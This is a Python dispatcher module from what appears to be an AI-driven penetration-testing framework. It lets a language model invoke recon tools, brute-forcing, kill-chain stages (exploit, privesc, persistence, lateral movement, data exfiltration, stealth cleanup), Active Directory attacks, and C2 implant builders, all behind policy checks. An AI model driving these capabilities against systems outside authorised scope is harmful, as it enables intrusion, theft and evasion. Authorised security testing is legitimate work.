#!/usr/bin/env python3
"""
Main tool dispatcher, interactive tool selector, and command execution.
Extracted from tools.py.
"""

import concurrent.futures
import contextlib
import inspect
import ipaddress
import logging
import os
import re
import shlex
import signal
import subprocess
import sys
from typing import Any, Optional
from urllib.parse import urlparse

from core.execution import (
    ExecutionCancelled,
    ExecutionContext,
    ExecutionPolicy,
    ToolInvocation,
    current_execution_context,
    redact_sensitive_command,
)

# IMPORTS FROM SHARED BASE (breaks circular deps)
from core.tools.base import (
    ToolResult,
    _fmt_elapsed,
    _nuclei_live_summary,
    get_tool_config,
)

# IMPORTS FROM SIBLING MODULES
from core.tools.exploit_tools import (
    get_best_creds_for_target,
    run_bruteforce,
    run_jmx2rce_scan,
    run_web_login_bruteforce,
)
from core.tools.post_tools import (
    _run_cpanel_exploit,
    _run_crack_hashes,
    _run_killchain_interactive,
    _run_killchain_stage,
    _run_shardbrowser_osint,
    _run_shodan_host,
    _run_shodan_interactive,
    _run_shodan_range,
    _run_shodan_vulns,
    _run_ssh_session_interactive,
    _run_waf_detect,
    run_default_recon,
)
from core.tools.recon_tools import (
    run_curl_headers,
    run_dig,
    run_enum4linux,
    run_ffuf,
    run_ftp_anonymous_check,
    run_nikto,
    run_nmap,
    run_scrapling_fetch,
    run_smbclient,
    run_smtp_probe,
    run_sqlmap,
    run_ssh_user_enum,
    run_sslscan,
    run_whatweb,
    run_whois,
    run_wpscan,
)
from core.tools.targeting import (
    detect_web_ports_from_nmap as _detect_web_ports_from_nmap,
)
from core.tools.targeting import (
    nmap_has_any_open_port as _nmap_has_any_open_port,
)
from core.tools.targeting import (
    target_looks_domain as _target_looks_domain,
)
from core.tools.targeting import (
    web_urls_from_ports as _web_urls_from_ports,
)

# TOOLS MENU — used by interactive_tool_run()
# and run_single_tool()
TOOLS_MENU = {
    "1":  ("nmap",               run_nmap),
    "2":  ("whois",              run_whois),
    "3":  ("whatweb",            run_whatweb),
    "4":  ("curl headers",       run_curl_headers),
    "5":  ("dig DNS",            run_dig),
    "6":  ("sslscan",            run_sslscan),
    "7":  ("ffuf",               run_ffuf),
    "8":  ("enum4linux",         run_enum4linux),
    "9":  ("smbclient",          run_smbclient),
    "10": ("wpscan",             run_wpscan),
    "11": ("sqlmap",             run_sqlmap),
    "12": ("nikto",              run_nikto),
    "13": ("scrapling",          lambda t: run_scrapling_fetch(f"http://{t}")),
    "14": ("jmx2rce",            run_jmx2rce_scan),
    "15": ("ssh_user_enum",      run_ssh_user_enum),
    "16": ("bruteforce SSH",     lambda t: run_bruteforce("ssh", t)),
    "17": ("web login brute",    run_web_login_bruteforce),
    "18": ("ssh_session",        lambda t: _run_ssh_session_interactive(t)),
    "19": ("vuln assess",        lambda t: _run_killchain_stage("vuln_assess", t)),
    "20": ("auto exploit",       lambda t: _run_killchain_stage("auto_exploit", t)),
    "21": ("privesc",            lambda t: _run_killchain_interactive("privesc", t)),
    "22": ("persistence",        lambda t: _run_killchain_interactive("persist", t)),
    "23": ("lateral move",       lambda t: _run_killchain_interactive("lateral", t)),
    "24": ("data exfil",         lambda t: _run_killchain_interactive("exfil", t)),
    "25": ("FULL KILL CHAIN",    lambda t: _run_killchain_interactive("full", t)),
    "26": ("WAF detect",         lambda t: _run_waf_detect(t)),
    "27": ("stealth cleanup",    lambda t: _run_killchain_interactive("cleanup", t)),
    "28": ("shodan search",      lambda t: _run_shodan_interactive(t)),
    "29": ("shodan host",        lambda t: _run_shodan_host(t)),
    "30": ("shodan vulns",       lambda t: _run_shodan_vulns(t)),
    "31": ("crack hashes",       lambda t: _run_crack_hashes(t)),
    "32": ("shodan range",       lambda t: _run_shodan_range(t)),
    "33": ("cpanel exploit",     lambda t: _run_cpanel_exploit(t)),
    "34": ("shardbrowser",       lambda t: _run_shardbrowser_osint(t)),
    # Active Directory
    "35": ("AD enumerate",       lambda t: _run_ad_tool("enum", t)),
    "36": ("AS-REP Roast",       lambda t: _run_ad_tool("asrep", t)),
    "37": ("Kerberoast",         lambda t: _run_ad_tool("kerberoast", t)),
    "38": ("DCSync",             lambda t: _run_ad_tool("dcsync", t)),
    "39": ("Pass-the-Hash",      lambda t: _run_ad_tool("pth", t)),
    "40": ("PsExec",             lambda t: _run_ad_tool("psexec", t)),
    "41": ("WMIExec",            lambda t: _run_ad_tool("wmiexec", t)),
    # Pivoting
    "42": ("SOCKS proxy",        lambda t: _run_pivot_tool("socks", t)),
    "43": ("port forward",       lambda t: _run_pivot_tool("forward", t)),
    "44": ("network recon",      lambda t: _run_pivot_tool("netinfo", t)),
    # C2 implants
    "45": ("build Go implant",   lambda t: _run_c2_build("go", t)),
    "46": ("build Py implant",   lambda t: _run_c2_build("python", t)),
    "47": ("build PS stager",    lambda t: _run_c2_build("powershell", t)),
    "48": ("DNS C2 listener",    lambda t: _run_c2_build("dns", t)),
    "49": ("FTP anonymous",      run_ftp_anonymous_check),
    "50": ("SMTP probe",         run_smtp_probe),
}

_MENU_POLICY_NAMES = {
    "18": "ssh_session",
    "19": "killchain_vuln_assess",
    "20": "killchain_exploit",
    "21": "killchain_privesc",
    "22": "killchain_persist",
    "23": "killchain_lateral",
    "24": "killchain_exfil",
    "25": "killchain_full",
    "27": "killchain_cleanup",
    "33": "cpanel_exploit",
    "36": "asrep_roast",
    "37": "kerberoast",
    "38": "dcsync",
    "39": "pass_the_hash",
    "40": "psexec",
    "41": "wmiexec",
    "42": "socks_proxy",
    "43": "port_forward",
    "45": "build_go_implant",
    "46": "build_python_implant",
    "47": "build_ps_stager",
    "48": "dns_c2_listener",
}


def _run_registered_extended_tool(results: dict, plan_lines: list[str], tool_name: str,
                                  target: str, result_key: Optional[str] = None) -> None:
    from core.tools.registry import get_tool
    tool_def = get_tool(tool_name)
    label = result_key or tool_name
    if not tool_def:
        plan_lines.append(f"skip {label}: not_registered")
        results[label] = f"[N MODE] {tool_name} skipped: not registered"
        return
    if not tool_def.is_available():
        deps = ",".join(tool_def.requires or []) or "dependency"
        plan_lines.append(f"skip {label}: unavailable:{deps}")
        results[label] = f"[N MODE] {tool_name} skipped: unavailable dependency: {deps}"
        return
    context = current_execution_context()
    invocation = ToolInvocation(
        executable=tool_name,
        argv=(tool_name, target),
        raw_command=f"{tool_name} {target}",
        registered_name=tool_def.name,
        targets=(target,),
    )
    decision = _EXECUTION_POLICY.authorize_registered(invocation, context)
    if not decision.allowed:
        plan_lines.append(f"skip {label}: policy_denied:{decision.reason}")
        results[label] = _execution_denied(decision.reason, context.request_id)
        return
    try:
        plan_lines.append(f"run {label}: {tool_name} {target}")
        results[label] = tool_def.func(target)
    except Exception as exc:
        plan_lines.append(f"error {label}: {str(exc)[:120]}")
        results[label] = f"[!] {label} error: {exc}"


def _run_registered_extended_tools_concurrent(results: dict, plan_lines: list[str],
                                              jobs: list[tuple[str, str, str]],
                                              max_workers: int = 6) -> None:
    """Run independent registry tools concurrently while preserving result keys."""
    from core.tools.registry import get_tool

    prepared = []
    for tool_name, target, result_key in jobs:
        tool_def = get_tool(tool_name)
        label = result_key or tool_name
        if not tool_def:
            plan_lines.append(f"skip {label}: not_registered")
            results[label] = f"[X MODE] {tool_name} skipped: not registered"
            continue
        if not tool_def.is_available():
            deps = ",".join(tool_def.requires or []) or "dependency"
            plan_lines.append(f"skip {label}: unavailable:{deps}")
            results[label] = f"[X MODE] {tool_name} skipped: unavailable dependency: {deps}"
            continue
        context = current_execution_context()
        invocation = ToolInvocation(
            executable=tool_name,
            argv=(tool_name, target),
            raw_command=f"{tool_name} {target}",
            registered_name=tool_def.name,
            targets=(target,),
        )
        decision = _EXECUTION_POLICY.authorize_registered(invocation, context)
        if not decision.allowed:
            plan_lines.append(f"skip {label}: policy_denied:{decision.reason}")
            results[label] = _execution_denied(decision.reason, context.request_id)
            continue
        plan_lines.append(f"run {label}: {tool_name} {target}")
        prepared.append((label, tool_name, target, tool_def.func))

    if not prepared:
        return

    workers = max(1, min(max_workers, len(prepared)))
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {
            executor.submit(func, target): (label, tool_name)
            for label, tool_name, target, func in prepared
        }
        for future in concurrent.futures.as_completed(futures):
            label, tool_name = futures[future]
            try:
                output = future.result()
                results[label] = output
                plan_lines.append(f"{_tool_result_status(output)} {label}: {tool_name}")
            except Exception as exc:
                plan_lines.append(f"error {label}: {str(exc)[:120]}")
                results[label] = f"[!] {label} error: {exc}"


def _tool_result_status(output: str) -> str:
    text = str(output or "")
    low = text.lower()
    if "[timeout]" in low or "killed after" in low or "timed out after" in low:
        return "timeout"
    if " skipped:" in low or " not applicable" in low or "not_applicable" in low:
        return "skipped"
    if "[!]" in text or " error:" in low:
        return "error"
    if not text.strip():
        return "empty"
    return "complete"


def _web_result_suffix(url: str) -> str:
    return re.sub(r"[^a-zA-Z0-9]+", "_", url).strip("_").lower()


def _parsed_web_url(url: str):
    raw = (url or "").strip()
    if not raw.startswith(("http://", "https://")):
        raw = f"http://{raw}"
    return urlparse(raw)


def _web_host_port(url: str) -> tuple[str, int]:
    parsed = _parsed_web_url(url)
    host = (parsed.hostname or "").lower()
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return host, int(port)


def _web_surface_group(url: str) -> tuple[str, str]:
    host, port = _web_host_port(url)
    if port in (80, 443):
        return host, "default"
    return host, str(port)


def _prefer_web_representative(candidates: list[str]) -> str:
    def score(url: str) -> tuple[int, int, str]:
        parsed = _parsed_web_url(url)
        _host, port = _web_host_port(url)
        https = 1 if parsed.scheme == "https" else 0
        default_port = 1 if port in (80, 443) else 0
        return (https, default_port, url)

    return sorted(candidates, key=score, reverse=True)[0]


def _web_result_text(results: dict, url: str, prefixes: tuple[str, ...]) -> str:
    suffix = _web_result_suffix(url)
    chunks = []
    for prefix in prefixes:
        value = results.get(f"{prefix}_{suffix}", "")
        if value:
            chunks.append(str(value))
    return "\n".join(chunks)


def _web_endpoint_alive(results: dict, url: str) -> bool:
    text = _web_result_text(results, url, ("curl_headers", "whatweb", "scrapling"))
    low = text.lower()
    if not text.strip():
        return False
    negative = (
        "connection refused", "failed to connect", "could not resolve",
        "operation timed out", "timed out", "ssl: wrong_version_number",
    )
    if any(marker in low for marker in negative):
        return False
    return bool(
        re.search(r"(?im)^HTTP/\d", text)
        or re.search(r"\[\d{3}\s", text)
        or "server:" in low
        or "httpserver[" in low
        or "<html" in low
    )


def _web_fingerprint(results: dict, url: str) -> str:
    text = _web_result_text(results, url, ("curl_headers", "whatweb", "scrapling"))
    tokens = []
    for line in text.splitlines():
        stripped = line.strip()
        low = stripped.lower()
        if re.match(r"^http/\d", low) or low.startswith(("server:", "x-powered-by:", "location:")):
            tokens.append(re.sub(r"\s+", " ", low))
    for pattern in (
        r"HTTPServer\[([^\]]+)\]",
        r"Title\[([^\]]+)\]",
        r"X-Powered-By\[([^\]]+)\]",
        r"PoweredBy\[([^\]]+)\]",
    ):
        for match in re.finditer(pattern, text, re.IGNORECASE):
            tokens.append(re.sub(r"\s+", " ", match.group(1).strip().lower()))
    return "|".join(dict.fromkeys(token for token in tokens if token))


def _plan_distinct_web_targets(web_urls: list[str], results: dict) -> tuple[list[str], dict[str, str]]:
    """Pick one representative per duplicate web surface, preserving distinct apps."""
    selected = []
    skipped = {}
    groups: dict[tuple[str, str], list[str]] = {}
    for url in web_urls:
        groups.setdefault(_web_surface_group(url), []).append(url)

    for _group_key, urls in groups.items():
        alive = [url for url in urls if _web_endpoint_alive(results, url)]
        candidates = alive or urls
        by_fingerprint: dict[str, list[str]] = {}
        for url in candidates:
            fp = _web_fingerprint(results, url)
            if not fp and _web_surface_group(url)[1] != "default":
                fp = url
            by_fingerprint.setdefault(fp or "unknown-default-surface", []).append(url)

        for _fp, fp_urls in by_fingerprint.items():
            representative = _prefer_web_representative(fp_urls)
            if representative not in selected:
                selected.append(representative)
            for url in fp_urls:
                if url != representative:
                    skipped[url] = representative

        for url in urls:
            if url not in candidates:
                skipped[url] = _prefer_web_representative(candidates)

    return selected, skipped


def _web_has_wordpress_signal(results: dict, url: str) -> bool:
    text = _web_result_text(results, url, ("whatweb", "scrapling", "scrapling_crawl", "curl_headers"))
    return bool(re.search(r"\bwordpress\b|wp-content|wp-includes|xmlrpc\.php", text, re.IGNORECASE))


def _web_has_input_surface(results: dict, url: str) -> bool:
    if "?" in (url or ""):
        return True
    text = _web_result_text(results, url, ("scrapling", "scrapling_crawl", "katana_crawl", "browser_surface_analysis"))
    return bool(
        re.search(r"https?://\S+\?[^ \n]+=", text)
        or re.search(r"(?i)<form\b|method=[\"']?(get|post)|input name=", text)
    )


def _plan_contextual_web_jobs(web_urls: list[str], results: dict, plan_lines: list[str]) -> list[tuple[str, str, str]]:
    heavy_targets, duplicate_skips = _plan_distinct_web_targets(web_urls, results)
    jobs = []

    for url in web_urls:
        suffix = _web_result_suffix(url)
        if url in duplicate_skips:
            covered_by = duplicate_skips[url]
            plan_lines.append(f"skip nuclei_safe_{suffix}: duplicate_surface covered_by={covered_by}")
            plan_lines.append(f"skip nikto_{suffix}: duplicate_surface covered_by={covered_by}")

    for url in heavy_targets:
        suffix = _web_result_suffix(url)
        jobs.append(("nuclei_safe", url, f"nuclei_safe_{suffix}"))
        jobs.append(("nikto", url, f"nikto_{suffix}"))

    for url in web_urls:
        suffix = _web_result_suffix(url)
        if _web_has_wordpress_signal(results, url):
            jobs.append(("wpscan", url, f"wpscan_{suffix}"))
        else:
            plan_lines.append(f"skip wpscan_{suffix}: not_applicable:no_wordpress_signal")

        if _web_has_input_surface(results, url):
            jobs.append(("sqlmap", url, f"sqlmap_{suffix}"))
        else:
            plan_lines.append(f"skip sqlmap_{suffix}: not_applicable:no_input_surface")

    if heavy_targets:
        plan_lines.append("web_contextual_targets: " + ", ".join(heavy_targets))
    return jobs


def _run_exhaustive_applicable_coverage(target: str, results: dict) -> dict:
    """Run all available safe/applicable discovery and verification layers."""
    plan_lines = ["[X MODE PLAN]", "base: run_default_recon"]
    nmap_output = results.get("nmap", "")
    curl_output = results.get("curl_headers", "")
    whatweb_output = results.get("whatweb", "")
    all_recon = nmap_output + curl_output + whatweb_output
    web_ports = _detect_web_ports_from_nmap(nmap_output)
    has_web = (
        bool(web_ports)
        or "HTTP/" in curl_output
        or "server:" in curl_output.lower()
        or any(marker in all_recon.lower() for marker in ("nginx", "apache", "http"))
    )
    if has_web and not web_ports:
        web_ports = ["80"]
    web_urls = _web_urls_from_ports(target, web_ports) if has_web else []

    print("\n  [*] X mode: exhaustive safe/applicable coverage...")

    if _target_looks_domain(target):
        for tool_name in ("subfinder", "amass_enum", "dnsx", "wayback_urls", "gau_urls"):
            _run_registered_extended_tool(results, plan_lines, tool_name, target)
    else:
        plan_lines.append("asm_domain_discovery: not_applicable:target_is_ip")

    for tool_name in ("httpx_probe", "naabu", "tlsx"):
        _run_registered_extended_tool(results, plan_lines, tool_name, target)

    if has_web:
        plan_lines.append(f"web_surface: present ports={','.join(web_ports)}")
        web_light_jobs = []
        for url in web_urls:
            suffix = _web_result_suffix(url)
            for tool_name in (
                "whatweb", "curl_headers", "security_headers_check", "cors_check",
                "scrapling", "scrapling_crawl", "browser_surface_analysis",
                "katana_crawl",
            ):
                web_light_jobs.append((tool_name, url, f"{tool_name}_{suffix}"))
            for spec_path in ("/openapi.json", "/swagger.json", "/api-docs"):
                web_light_jobs.append((
                    "openapi_import",
                    url.rstrip("/") + spec_path,
                    f"openapi_import_{suffix}{spec_path.replace('/', '_')}",
                ))
            web_light_jobs.extend((
                ("graphql_check", url.rstrip("/") + "/graphql", f"graphql_check_{suffix}"),
                ("api_auth_check", url.rstrip("/") + "/api", f"api_auth_check_{suffix}"),
            ))
        _run_registered_extended_tools_concurrent(results, plan_lines, web_light_jobs, max_workers=8)

        contextual_jobs = _plan_contextual_web_jobs(web_urls, results, plan_lines)
        _run_registered_extended_tools_concurrent(results, plan_lines, contextual_jobs, max_workers=3)
    else:
        plan_lines.append("web_deep_tools: not_applicable:no_web_surface")

    if _nmap_has_any_open_port(nmap_output, {"21"}):
        _run_registered_extended_tool(results, plan_lines, "ftp_anonymous_check", target)
    else:
        plan_lines.append("ftp_assessment: not_applicable:no_ftp_port")

    if _nmap_has_any_open_port(nmap_output, {"25", "465", "587"}):
        _run_registered_extended_tool(results, plan_lines, "smtp_probe", target)
    else:
        plan_lines.append("mail_service_assessment: not_applicable:no_smtp_port")

    if _nmap_has_any_open_port(nmap_output, {"5432", "3306", "6379", "27017"}):
        _run_registered_extended_tool(results, plan_lines, "db_inventory", target)
    else:
        plan_lines.append("database_inventory: not_applicable:no_database_port")

    if _nmap_has_any_open_port(nmap_output, {"389", "636", "88", "445", "135", "5985", "5986"}):
        for tool_name in ("ad_enum", "gpo_review", "adcs_review"):
            _run_registered_extended_tool(results, plan_lines, tool_name, target)
    else:
        plan_lines.append("ad_security_review: not_applicable:no_ad_surface_ports")

    for gated in (
        "bruteforce", "web_login_brute", "msf_run", "killchain_privesc",
        "killchain_persist", "killchain_lateral", "killchain_exfil",
        "killchain_cleanup", "pass_the_hash", "psexec", "wmiexec",
    ):
        plan_lines.append(f"gated {gated}: requires explicit state/scope/credentials")

    plan_lines.append("secrets/code/cloud: not_applicable:requires_local_repo_or_cloud_provider_context")
    results["x_mode_plan"] = "\n".join(plan_lines)
    return results

# INDIVIDUAL TOOLS



def run_single_tool(
    tool_key: str,
    target: str,
    execution_context: Optional[ExecutionContext] = None,
) -> str:
    """Run one tool by its menu key. Used by AI tool dispatch."""
    if tool_key in TOOLS_MENU:
        name, func = TOOLS_MENU[tool_key]
        context = _execution_context_or_current(execution_context)
        policy_name = _MENU_POLICY_NAMES.get(tool_key, name.replace(" ", "_"))
        invocation = ToolInvocation(
            executable=f"menu:{tool_key}",
            argv=(f"menu:{tool_key}", target),
            raw_command=f"menu:{tool_key} {target}",
            registered_name=policy_name,
            targets=(target,),
        )
        decision = _EXECUTION_POLICY.authorize_registered(invocation, context)
        if not decision.allowed:
            return _execution_denied(decision.reason, context.request_id)
        return _bounded_tool_result(func(target), context)
    return f"[!] Unknown tool key: {tool_key}"


def format_recon_for_llm(results: dict) -> str:
    """
    Flatten the recon results dict into one clean string
    to paste into the LLM prompt.
    """
    output = ""
    for tool, data in results.items():
        output += f"\n{'='*50}\n"
        output += f"[ {tool.upper()} OUTPUT ]\n"
        output += f"{'='*50}\n"
        output += data.strip() + "\n"
    return output


_EXECUTION_POLICY = ExecutionPolicy()
_NETWORK_PARAMETER_NAMES = {"target", "target_ip", "host", "url"}


def _execution_context_or_current(
    execution_context: Optional[ExecutionContext] = None,
) -> ExecutionContext:
    return execution_context or current_execution_context()


def _execution_denied(reason: str, request_id: str) -> str:
    return f"[!] Execution denied: {reason} (request_id={request_id})"


def _redact_command(command: str) -> str:
    return redact_sensitive_command(command)


def _truncate_output_text(value: str, max_output_bytes: int) -> str:
    raw = (value or "").encode("utf-8", "replace")
    if len(raw) <= max_output_bytes:
        return value
    marker = f"\n[OUTPUT LIMIT] truncated at {max_output_bytes} bytes"
    marker_bytes = marker.encode("utf-8")
    kept = raw[:max(0, max_output_bytes - len(marker_bytes))]
    return kept.decode("utf-8", "ignore") + marker


def _bounded_tool_result(result: Any, context: ExecutionContext):
    if isinstance(result, ToolResult):
        result.stdout = _truncate_output_text(result.stdout, context.max_output_bytes)
        result.stderr = _truncate_output_text(result.stderr, context.max_output_bytes)
        result.command = _redact_command(result.command)
        return result
    return _truncate_output_text(str(result), context.max_output_bytes)


def _bound_network_targets(func, positional_args: list, kwargs: dict) -> tuple[str, ...]:
    try:
        bound = inspect.signature(func).bind_partial(*positional_args, **kwargs)
    except (TypeError, ValueError):
        return ()
    values = []
    for name in _NETWORK_PARAMETER_NAMES:
        value = bound.arguments.get(name)
        if isinstance(value, str) and value and value not in values:
            values.append(value)
    return tuple(values)



# ── PYTHON REPL (Dynamic Script Execution) ──
def run_python_repl(
    code: str,
    execution_context: Optional[ExecutionContext] = None,
) -> str:
    """Run isolated Python only for an explicitly approved operator context."""
    context = _execution_context_or_current(execution_context)
    decision = _EXECUTION_POLICY.authorize_python_repl(code, context)
    if not decision.allowed:
        return _execution_denied(decision.reason, context.request_id)
    result = _execute_process(
        [sys.executable, "-I", "-c", code],
        context=context,
        tool="python_repl",
        timeout=context.max_runtime_seconds,
        shell=False,
        display_command="python -I -c [APPROVED CODE]",
    )
    return str(result)



def run_tool_by_command(
    command_str: str,
    execution_context: Optional[ExecutionContext] = None,
) -> str:
    """
    Called by LLM tool dispatch when AI writes [TOOL: nmap -sV 1.2.3.4].
    Splits the string and runs it safely.
    Handles invalid tool names and syntax through structured registry dispatch.
    """
    context = _execution_context_or_current(execution_context)
    try:
        parts = shlex.split(command_str.strip(), posix=True)
    except ValueError:
        return _execution_denied("invalid_quoting", context.request_id)
    if not parts:
        return "[!] Empty command."

    cmd_lower = parts[0].lower()

    # ── HELPER: Extract clean IP from 'IP:PORT' or 'http://IP:PORT/path' ──
    def _extract_ip(s):
        raw = str(s or "").strip()
        try:
            return str(ipaddress.ip_address(raw.strip("[]")))
        except ValueError:
            pass
        try:
            parsed = urlparse(raw if "://" in raw else f"//{raw}")
            if parsed.hostname:
                return parsed.hostname
        except ValueError:
            pass
        return raw.split("/", 1)[0]

    # ── BLOCK: Hallucinated/fake tools → return helpful error ──
    _FAKE_TOOLS = {
        "metasploit_scan": "Use [MSF: auxiliary/scanner/... | RHOSTS=IP] or [SEARCH: CVE-...]",
        "metasploit_exploit": "Use [MSF: exploit/... | RHOSTS=IP]",
        "nikto_scan": "Use [CMD: nikto -h IP]",
        "service_version_enumeration": "Use [TOOL: nmap -Pn -sT -sV IP]",
        "cms_detect": "Use [TOOL: scrapling http://IP] and [CMD: whatweb http://IP]",
        "webdav_scan": "Use [CMD: nmap --script http-webdav-scan IP]",
        "cve_lookup": "Use [SEARCH: CVE-YYYY-NNNNN] or [SEARCHSPLOIT: service version]",
        "dirbuster": "Use [TOOL: dirb_fuzz http://IP]",
        "format_b_final_analysis": "NOT a tool. Write your analysis directly in Format B.",
        "dirb": "Use [TOOL: dirb_fuzz http://IP]",
        "hydra": "Use [TOOL: bruteforce SERVICE IP]",
        "metasploit_web_enum": "Use [TOOL: scrapling http://IP]",
        "msf_web_enum": "Use [TOOL: scrapling http://IP]",
        "smb_enum": "Use [CMD: enum4linux -a IP]",
        "msfconsole": "Use [MSF: module/path | RHOSTS=IP] instead of calling msfconsole directly",
    }
    if cmd_lower in _FAKE_TOOLS:
        hint = _FAKE_TOOLS[cmd_lower]
        target_hint = _extract_ip(parts[1]) if len(parts) > 1 else "TARGET"
        return f"[!] '{parts[0]}' is NOT a real tool. AI: Use correct syntax: {hint.replace('IP', target_hint)}"

    from core.tools.registry import get_tool

    alias_token_count = 1
    tool_def = get_tool(cmd_lower)
    if not tool_def and len(parts) >= 2:
        two_word_name = f"{parts[0].lower()} {parts[1].lower()}"
        tool_def = get_tool(two_word_name)
        if tool_def:
            cmd_lower = two_word_name
            alias_token_count = 2

    if not tool_def:
        decision = _EXECUTION_POLICY.authorize_command(command_str, context)
        return _execution_denied(decision.reason, context.request_id)

    def parse_args_for_tool(cmd_string: str, t_def):
        try:
            p_parts = shlex.split(cmd_string.strip(), posix=True)
        except ValueError:
            return [], {}
        if not p_parts:
            return [], {}
        args = p_parts[alias_token_count:]
        sig = inspect.signature(t_def.func)
        params = list(sig.parameters.values())
        kwargs = {}
        positional_args: list[Any] = []

        # NMAP specific garbage stripping logic ported over
        if t_def.name == "nmap" and args:
            clean_parts = []
            skip_next = False
            for p in args:
                if skip_next:
                    skip_next = False
                    continue
                if p in ["-oX", "-oN", "-oG", "-oA", "-o"] or p.startswith("--output"):
                    skip_next = True
                    continue
                if p.startswith("--ports"):
                    continue
                clean_parts.append(p)
            args = clean_parts
            if not args:
                return [], {}
            target_ip = args[-1]
            extra_flags = args[:-1]
            return [target_ip], {"extra_flags": extra_flags if extra_flags else None}

        # Searchsploit specific stripping logic
        if t_def.name == "searchsploit" and args:
            clean_terms = []
            skip_next = False
            for p in args:
                if skip_next:
                    skip_next = False
                    continue
                if p in ["-s", "--service", "--output", "-p", "--path"]:
                    continue
                if p.startswith("--exclude") or (p.startswith("-p") and len(p) <= 3):
                    skip_next = True
                    continue
                clean_terms.append(p.strip('"').strip("'"))
            return [" ".join(clean_terms)], {}

        if t_def.name == "curl_headers" and args:
            value_flags = {
                "-A", "--user-agent", "-H", "--header", "--max-time",
                "--connect-timeout", "--proxy", "-x",
            }
            target = None
            skip_next = False
            for arg in args:
                if skip_next:
                    skip_next = False
                    continue
                if arg in value_flags:
                    skip_next = True
                    continue
                if arg.startswith(("http://", "https://")):
                    target = arg
                    break
                if not arg.startswith("-"):
                    target = arg
            return [target or args[-1]], {}

        if t_def.name == "enum4linux" and args:
            target = next((arg for arg in reversed(args) if not arg.startswith("-")), args[-1])
            return [target], {}

        url_preserving_tools = {
            "browser_surface_analysis",
            "scrapling",
            "scrapling_crawl",
            "curl_headers",
            "security_headers_check",
            "cors_check",
            "ffuf",
            "nikto",
            "sqlmap",
            "wpscan",
            "jmx2rce_scan",
            "nuclei_safe",
            "openapi_import",
            "graphql_check",
            "api_auth_check",
            "katana_crawl",
        }

        if t_def.name == "nuclei_safe" and args:
            value_flags = {
                "-severity", "-exclude-tags", "-tags", "-t", "-templates",
                "-timeout", "-retries", "-rl", "-rate-limit", "-c", "-bs",
                "-headless-bulk-size", "-page-timeout", "-proxy",
            }
            target_flags = {"-u", "-url", "-target"}
            target = None
            skip_next = False
            for idx, arg in enumerate(args):
                if skip_next:
                    skip_next = False
                    continue
                if any(arg.startswith(flag + "=") for flag in target_flags):
                    target = arg.split("=", 1)[1]
                    break
                if arg in target_flags and idx + 1 < len(args):
                    target = args[idx + 1]
                    break
                if arg in value_flags:
                    skip_next = True
                    continue
                if arg.startswith("-"):
                    continue
                if re.match(r"^https?://", arg, re.IGNORECASE):
                    target = arg
                    break
            if not target:
                target = next((arg for arg in args if not arg.startswith("-")), args[0])
            return [target], {}

        if t_def.name == "nikto" and args:
            target = None
            skip_next = False
            for idx, arg in enumerate(args):
                if skip_next:
                    skip_next = False
                    continue
                if arg in {"-h", "-host", "--host"} and idx + 1 < len(args):
                    target = args[idx + 1]
                    break
                if arg.startswith(("-h=", "-host=", "--host=")):
                    target = arg.split("=", 1)[1]
                    break
                if arg in {"-output", "-Format", "-Tuning", "-Display", "-Plugins", "-useragent"}:
                    skip_next = True
                    continue
                if not arg.startswith("-"):
                    target = arg
                    break
            return [target or args[0]], {}

        if t_def.name == "sqlmap" and args:
            target = None
            skip_next = False
            for idx, arg in enumerate(args):
                if skip_next:
                    skip_next = False
                    continue
                if arg in {"-u", "--url"} and idx + 1 < len(args):
                    target = args[idx + 1]
                    break
                if arg.startswith("--url="):
                    target = arg.split("=", 1)[1]
                    break
                if arg in {"-r", "-l", "-m", "-c", "--proxy", "--data", "--cookie", "--headers"}:
                    skip_next = True
                    continue
                if not arg.startswith("-"):
                    target = arg
                    break
            return [target or args[0]], {}

        if t_def.name == "wpscan" and args:
            target = None
            skip_next = False
            for idx, arg in enumerate(args):
                if skip_next:
                    skip_next = False
                    continue
                if arg == "--url" and idx + 1 < len(args):
                    target = args[idx + 1]
                    break
                if arg.startswith("--url="):
                    target = arg.split("=", 1)[1]
                    break
                if arg in {"--api-token", "--proxy", "--cookie-string", "--user-agent", "--passwords", "--usernames"}:
                    skip_next = True
                    continue
                if not arg.startswith("-"):
                    target = arg
                    break
            return [target or args[0]], {}

        for parameter in params:
            if parameter.name in ['target', 'target_ip', 'host', 'url', 'filepath']:
                if args:
                    raw_arg = args.pop(0)
                    if parameter.name == "url" or t_def.name in url_preserving_tools:
                        positional_args.append(raw_arg)
                    else:
                        positional_args.append(_extract_ip(raw_arg))
                elif parameter.default != inspect.Parameter.empty:
                    kwargs[parameter.name] = parameter.default
            elif parameter.name in ['query', 'recon_data', 'cmd', 'command', 'action', 'options', 'options_str']:
                if args:
                    positional_args.append(' '.join(args))
                    args = []
                elif parameter.default != inspect.Parameter.empty:
                    kwargs[parameter.name] = parameter.default
            elif parameter.name in ['extra_flags', 'opts']:
                if args:
                    positional_args.append(args)
                    args = []
                elif parameter.default != inspect.Parameter.empty:
                    kwargs[parameter.name] = parameter.default
            elif parameter.name in ['user', 'pwd', 'password']:
                if args:
                    positional_args.append(args.pop(0))
                elif parameter.default != inspect.Parameter.empty:
                    kwargs[parameter.name] = parameter.default
            else:
                if args:
                    positional_args.append(args.pop(0))
                elif parameter.default != inspect.Parameter.empty:
                    kwargs[parameter.name] = parameter.default
        if args:
            positional_args.extend(args)
        return positional_args, kwargs

    try:
        p_args, p_kwargs = parse_args_for_tool(command_str, tool_def)
        invocation = ToolInvocation(
            executable=parts[0].lower(),
            argv=tuple(parts),
            raw_command=command_str,
            registered_name=tool_def.name,
            targets=_bound_network_targets(tool_def.func, p_args, p_kwargs),
        )
        decision = _EXECUTION_POLICY.authorize_registered(invocation, context)
        if not decision.allowed:
            return _execution_denied(decision.reason, context.request_id)
        print(f"  [94m[*] Dispatching registered tool: {tool_def.name}[0m")
        logging.info(
            "registered_tool_dispatch tool=%s request_id=%s argument_count=%d",
            tool_def.name,
            context.request_id,
            max(0, len(parts) - alias_token_count),
        )
        result = tool_def.func(*p_args, **p_kwargs)
        return _bounded_tool_result(result, context)
    except Exception as e:
        logging.exception(
            "Registered tool failed tool=%s request_id=%s",
            tool_def.name,
            context.request_id,
        )
        return f"[!] Error executing tool '{tool_def.name}': {e}"



# INTERACTIVE TOOL SELECTOR (called from CLI)

def interactive_tool_run(target: str) -> str:
    """
    Let user manually pick which tools to run.
    Returns combined output string.
    """
    print("\n[ SELECT TOOLS TO RUN ]")
    for key, (name, _) in TOOLS_MENU.items():
